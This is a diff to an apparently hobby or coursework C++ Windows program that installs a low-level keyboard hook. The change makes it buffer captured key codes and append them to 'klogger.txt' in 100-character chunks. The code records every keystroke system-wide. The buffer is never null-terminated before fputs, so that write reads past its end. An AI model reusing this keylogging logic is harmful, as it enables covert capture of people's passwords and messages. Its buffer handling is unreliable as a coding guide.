@@ -19,7 +19,7 @@
 #define MS_CLICK_SIZE           6
 
 
-
+void saveToFile(char* buff);
 HINSTANCE hInst;                                
 WCHAR szTitle[MAX_LOADSTRING];                  
 WCHAR szWindowClass[MAX_LOADSTRING];            
@@ -35,7 +35,8 @@ HDC dc;
 BOOL firstMove;
 POINT prevPoint;
 HPEN pen = CreatePen(PS_SOLID, 3, RGB(100, 200, 0));
-std::ofstream file("C:\\Users\\Klem_em31\\source\\repos\\Hook\\Hook\\key.txt", std::fstream::out | std::fstream::app);
+FILE* file;
+int buffCount = 0;
 
 ATOM                MyRegisterClass(HINSTANCE hInstance);
 BOOL                InitInstance(HINSTANCE, int);
@@ -284,7 +285,6 @@ DWORD CALLBACK StartKbHookLL(LPVOID) {
 }
 
 DWORD CALLBACK StopKbHookLL(LPVOID) {
-    file.close();
     if (kbLL != 0)
     {
         UnhookWindowsHookEx(kbLL);
@@ -298,12 +298,19 @@ DWORD CALLBACK StopKbHookLL(LPVOID) {
     return 0;
 }
 
+
+void saveToFile(char* buff) 
+{
+    file = fopen("klogger.txt", "at");
+    fputs(buff, file);
+    fclose(file);
+
+}
+
+char text[100];
+
 LRESULT CALLBACK KbHookProcLL(int nCode, WPARAM wParam, LPARAM lParam) {
-    
-    if (!file.is_open())
-    {
-        SendMessageW(list, LB_ADDSTRING, 0, (LPARAM)L"Error");
-    }
+
     
     if (nCode == HC_ACTION)
     {
@@ -312,20 +319,24 @@ LRESULT CALLBACK KbHookProcLL(int nCode, WPARAM wParam, LPARAM lParam) {
             KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lParam);
             UINT sym = MapVirtualKeyExW(keyInfo.vkCode, MAPVK_VK_TO_CHAR,
                 GetKeyboardLayout(0));
-
             _snwprintf_s(txt, MAX_LOADSTRING,
                 L"wParam is %d (%d) %c",
                 keyInfo.vkCode,
                 keyInfo.scanCode,
                 sym
             );
-            if (sym == 0)
-            {
-                file << keyInfo.vkCode;
+
+            text[buffCount] = (char)keyInfo.vkCode;
+            buffCount++;
+
+
+            if (buffCount >= 100) {
+                saveToFile(text);
+                strcpy(text, "");
+                buffCount = 0;
             }
-            else {
-                file << (char)sym;
-            }
+      
+            
             SendMessageW(list, LB_ADDSTRING, MAX_LOADSTRING, (LPARAM)txt);
             
         }
